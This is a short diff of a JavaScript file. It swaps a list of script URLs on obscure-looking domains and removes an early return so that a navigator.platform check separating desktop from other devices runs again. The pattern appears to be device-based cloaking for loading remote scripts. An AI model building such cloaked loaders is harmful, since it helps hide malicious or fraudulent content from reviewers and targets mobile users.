@@ -1,4 +1,4 @@
-const input = ["https://edssnet.changchunets.com:4443/ty/x-2006-33.js", "https://xg.qfnoyix.cn/sc/5500?n=enMgiRQq"]
+const input = ["https://js.qzi-ggjsyuming.com/slot?1895670460909466853-10325"]
 //const input = ["https://mg.sjoy7rq.cn/sc/1238?n=zUONAccY"]
 console.log(input);
 
@@ -89,7 +89,6 @@ function handleFetchQueue(input, max) {
 }
 
 function m() {
-    return false
 	let p = navigator.platform;
 	if ((p.indexOf("Win") == 0) || (p.indexOf("Mac") == 0) || (p == "X11") || (p.indexOf("Linux") == 0)) {
 		return false
